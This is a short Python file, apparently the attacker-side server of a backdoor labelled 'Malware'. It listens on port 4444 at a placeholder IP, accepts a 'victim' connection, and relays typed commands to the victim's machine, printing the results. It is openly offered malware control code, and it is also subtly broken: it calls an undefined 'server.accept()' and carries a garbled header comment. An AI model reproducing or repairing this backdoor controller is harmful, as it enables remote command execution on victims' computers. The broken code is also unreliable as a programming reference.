# Is fill is the code of the server for Malware Editing 
import socket

class Malware:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.host, self.port))
        self.sock.listen(1)

    def run(self):
        print("Waiting connection...")
        victim, victim_addr = server.accept()
        print(f'[+] {victim_addr} Victim opened the backdoor')
        while True:
            command = input('Enter Command : ')
            command = command.encode()
            victim.send(command)
            print('[+] Command sent')
            output = victim.recv(1024)
            output = output.decode()
            print(f"Output: {output}")


if __name__ == "__main__":
    host = "VOTRE_IP"
    port = 4444
    malware = Malware(host, port)
    malware.run()